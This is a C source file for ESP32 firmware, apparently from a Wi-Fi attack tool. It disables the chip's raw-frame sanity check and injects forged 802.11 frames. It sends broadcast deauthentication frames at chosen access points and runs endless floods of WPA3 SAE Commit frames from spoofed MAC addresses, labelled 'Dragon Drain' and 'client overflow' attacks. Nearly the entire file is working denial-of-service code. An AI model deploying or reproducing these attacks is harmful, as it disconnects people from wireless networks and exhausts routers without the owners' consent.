/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 *
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>
#include "../../main/global.h"

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

#include <esp_wifi.h>

#include "wifi_controller.h"

#include "esp_random.h"
#include "mbedtls/ecp.h"
#include "mbedtls/bignum.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"
#include "esp_timer.h"

static const char *TAG = "wsl_bypasser";
/**
 * @brief Deauthentication frame template
 */
uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication (0xC0)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Nadawca (BSSID AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
    0x00, 0x00,                         // Seq Control
    0x01, 0x00                          // Reason: Unspecified (0x0001)
};


//SAE properties:
static int frame_count = 0;
static int64_t start_time = 0;

#define NUM_CLIENTS 20


/* --- mbedTLS Crypto --- */
static mbedtls_ecp_group ecc_group;      // grupa ECC (secp256r1)
static mbedtls_ecp_point ecc_element;      // bieżący element (punkt ECC)
static mbedtls_mpi ecc_scalar;             // bieżący skalar
static mbedtls_ctr_drbg_context ctr_drbg; 
static mbedtls_entropy_context entropy;

/* Router BSSID */
static uint8_t bssid[6] = { 0x30, 0xAA, 0xE4, 0x3C, 0x3F, 0x68};
 

/* Spoofing base address. Each frame modifies last byte of the address to create a unique source address.*/
static const uint8_t base_srcaddr[6] = { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x71 };

static uint8_t spoofed_src[6];  // really spoofed source address
static int next_src = 0;        // spoofing index

#define NUM_MAC_POOL 20

// Stała tablica 20 MAC adresów – każdy wpis ma stały prefiks i rosnący ostatni bajt
static const uint8_t mac_pool[NUM_MAC_POOL][6] = {
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x71 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x72 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x73 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x74 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x75 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x76 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x77 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x78 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x79 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x7A },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x7B },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x7C },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x7D },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x7E },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x7F },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x80 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x81 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x82 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x83 },
    { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x84 }
};


static const uint8_t auth_req_sae_commit_header[] = {
    0xb0, 0x00, 0x00, 0x00,                   // Frame Control & Duration
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,         // Address 1 (BSSID – placeholder)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,         // Address 2 (Source – placeholder)
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,         // Address 3 (BSSID – placeholder)
    0x00, 0x00,                               // Sequence Control
    0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x13, 0x00  // SAE Commit fixed part
};

#define AUTH_REQ_SAE_COMMIT_HEADER_SIZE (sizeof(auth_req_sae_commit_header))

// END of SAE properties


//SAE Methods

static int trng_random_callback(void *ctx, unsigned char *output, size_t len) {
    (void)ctx;
    esp_fill_random(output, len);
    return 0;
}

static int crypto_init(void) {
    int ret;
    const char *pers = "dragon_drain";

    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    // TRNG as entropy source
    ret = mbedtls_ctr_drbg_seed(&ctr_drbg,
                             trng_random_callback,
                             NULL,
                             (const unsigned char *) pers, strlen(pers));

    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ctr_drbg_seed failed: %d", ret);
        return ret;
    }

    mbedtls_ecp_group_init(&ecc_group);
    mbedtls_ecp_point_init(&ecc_element);
    mbedtls_mpi_init(&ecc_scalar);

    ret = mbedtls_ecp_group_load(&ecc_group, MBEDTLS_ECP_DP_SECP256R1);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_group_load failed: %d", ret);
        return ret;
    }

    ESP_LOGI(TAG, "Crypto context initialized with TRNG (secp256r1)");
    return 0;
}

/* MAC address from the pool of 20 addresses for dragon drain. */
static void update_spoofed_src(void)
{
    // Next address from the pool
    memcpy(spoofed_src, mac_pool[next_src], sizeof(mac_pool[0]));
    next_src = (next_src + 1) % NUM_MAC_POOL;
}

/*
 * Random MAC for client overflow attack.
 */
static void update_spoofed_src_random(void) {
    esp_err_t ret = mbedtls_ctr_drbg_random(&ctr_drbg, spoofed_src, 6);
    if (ret != 0) {
        ESP_LOGE(TAG, "Unable to generate random MAC: %d", ret);
        return;
    }

    spoofed_src[0] &= 0xFE;  // bit multicast = 0
    spoofed_src[0] |= 0x02;  // locally administered = 1

    next_src = (next_src + 1) % NUM_CLIENTS;
}

/*
Injects SAE Commit frame with spoofed source address.
This function generates a random scalar, computes the corresponding ECC point,
and constructs the SAE Commit frame with the spoofed source address.
 */
void inject_sae_commit_frame(int randomMac) {
    uint8_t buf[128];
    memset(buf, 0, sizeof(buf));
    memcpy(buf, auth_req_sae_commit_header, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
    memcpy(buf + 4, bssid, 6);

    /*ESP_LOGI(TAG, "Spoofed_src: %02X:%02X:%02X:%02X:%02X:%02X",
     spoofed_src[0], spoofed_src[1], spoofed_src[2],
     spoofed_src[3], spoofed_src[4], spoofed_src[5]);*/


    memcpy(buf + 10, spoofed_src, 6);
    memcpy(buf + 16, bssid, 6);

    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = 19;

    uint8_t *pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;
    int ret;
    size_t scalar_size = 32;

    do {
        ret = mbedtls_mpi_fill_random(&ecc_scalar, scalar_size, mbedtls_ctr_drbg_random, &ctr_drbg);
        if (ret != 0) {
            ESP_LOGE(TAG, "mbedtls_mpi_fill_random failed: %d", ret);
            return;
        }
    } while (mbedtls_mpi_cmp_int(&ecc_scalar, 0) <= 0 ||
             mbedtls_mpi_cmp_mpi(&ecc_scalar, &ecc_group.N) >= 0);

    ret = mbedtls_mpi_write_binary(&ecc_scalar, pos, scalar_size);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_mpi_write_binary failed: %d", ret);
        return;
    }
    pos += scalar_size;

    ret = mbedtls_ecp_mul(&ecc_group, &ecc_element, &ecc_scalar, &ecc_group.G, mbedtls_ctr_drbg_random, &ctr_drbg);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_mul failed: %d", ret);
        return;
    }

    uint8_t point_buf[65];
    size_t point_len = 0;
    ret = mbedtls_ecp_point_write_binary(&ecc_group, &ecc_element, MBEDTLS_ECP_PF_UNCOMPRESSED,
                                         &point_len, point_buf, sizeof(point_buf));
    if (ret != 0 || point_len != 65) {
        ESP_LOGE(TAG, "mbedtls_ecp_point_write_binary failed: %d", ret);
        return;
    }

    // Byte 0x04 (prefix) + X || Y
    memcpy(pos, point_buf + 1, 64); // skip 0x04 prefix
    pos += 64;

    // Select the right method depending on the attack type
    // For Dragon Drain attack, use the MAC address pool
    // For Client Overflow attack, use random MAC address
    if (randomMac) {
        update_spoofed_src_random();
    } else {
        update_spoofed_src();
    }


    size_t total_len = pos - buf;

    //ESP_LOGI(TAG, "Sending SAE frame, length: %d bytes", total_len);
    //ESP_LOG_BUFFER_HEX(TAG, buf, total_len);

    esp_err_t ret_tx = esp_wifi_80211_tx(WIFI_IF_STA, buf, total_len, false);
    if (ret_tx != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_80211_tx failed: %s", esp_err_to_name(ret_tx));
    } else {
        //ESP_LOGI(TAG, "SAE Commit sent");
    }

    if (frame_count == 0) {
        start_time = esp_timer_get_time(); 
    }
    frame_count++;

    if (frame_count >= 100) {
        int64_t now = esp_timer_get_time();
        double seconds = (now - start_time) / 1e6;
        double fps = frame_count / seconds;
        ESP_LOGI(TAG, "AVG FPS: %.2f", fps);
        framesPerSecond = (int)fps;
        frame_count = 0;
        if (framesPerSecond == 0) {
            vTaskDelay(pdMS_TO_TICKS(50));//give display a chance to pick up changes - just once
        }
        //ESP_LOGI("MEM", "Free heap: %d bytes", esp_get_free_heap_size());
        //ESP_LOGI("MEM", "Free 8-bit heap: %d bytes", heap_caps_get_free_size(MALLOC_CAP_8BIT));
    }

}

void prepareAttack(const wifi_ap_record_t ap_record) {
    globalDataCount = 1;
    globalData[0] = strdup((char *)ap_record.ssid);
    memcpy(spoofed_src, base_srcaddr, 6);
    memcpy(bssid, ap_record.bssid, sizeof(bssid));
    next_src = 0;
    if (crypto_init() != 0) {
        ESP_LOGE(TAG, "Crypto initialization failed");
        return;
    }

}

void startRandomMacSaeClientOverflow(const wifi_ap_record_t ap_record) {
    prepareAttack(ap_record);
     while (1) {
        inject_sae_commit_frame(1);
        vTaskDelay(pdMS_TO_TICKS(12));
    }
}

void start20MacsSaeDragonDrain(const wifi_ap_record_t ap_record) {
    prepareAttack(ap_record);
    while (1) {
        inject_sae_commit_frame(0);
        vTaskDelay(pdMS_TO_TICKS(12));
    }
}

// END of SAE Methods

static uint32_t counter = 0;


/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size)
{
    ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_INFO);
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}



void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count)
{

    if (ap_records == NULL || count == 0)
    {
        ESP_LOGI(TAG, "ERROR: Tablica ap_records jest pusta!");
        return;
    }

    //taskENTER_CRITICAL(&dataMutex);

    globalDataCount = count;
    for (size_t i = 0; i < count; i++) {
        wifi_ap_record_t *ap_record = &ap_records[i];

        if (ap_record == NULL)
        {
            ESP_LOGI(TAG, "ERROR: Empty element");
            return;
        }

        if (globalData[i] != NULL) {
            free(globalData[i]); // avoid memory leak!
        }
        globalData[i] = strdup((char *)ap_record->ssid);


        ESP_LOGI(TAG, "Preparations to send deauth frame...");
        ESP_LOGI(TAG, "Target SSID: %s", ap_record->ssid);
        ESP_LOGI(TAG, "Target CHANNEL: %d", ap_record->primary);
        ESP_LOGI(TAG, "Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                 ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                 ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
      
        wifictl_set_channel(ap_record->primary);

        if (counter == 0) {
            start_time = esp_timer_get_time(); // Pobranie aktualnego czasu w µs
        }

        uint8_t deauth_frame[sizeof(deauth_frame_default)];
        memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
        memcpy(&deauth_frame[10], ap_record->bssid, 6);
        memcpy(&deauth_frame[16], ap_record->bssid, 6);

        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        counter++;

        int64_t elapsed_time = esp_timer_get_time() - start_time;
        if (elapsed_time >= 1000000) {
            ESP_LOGD(TAG, "%u frames sent per second", counter);
            framesPerSecond = counter;
            counter = 0; 
            start_time = esp_timer_get_time(); 
        }

        vTaskDelay(pdMS_TO_TICKS(10));
    }

    //taskEXIT_CRITICAL(&dataMutex);

}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record)
{
    ESP_LOGI(TAG, "Sending deauth frame...");
    ESP_LOGI(TAG, "CHANNEL: %d", ap_record->primary);
    ESP_LOGI(TAG, "SSID: %s", ap_record->ssid);
    ESP_LOGI(TAG, "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
             ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);

    //ESP_LOGI(TAG, "Kicking all connected STAs from AP");
    //ESP_ERROR_CHECK(esp_wifi_deauth_sta(0));
    //esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
    //esp_wifi_set_promiscuous(true);
    //ESP_LOGI(TAG, "Channel set.");

    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}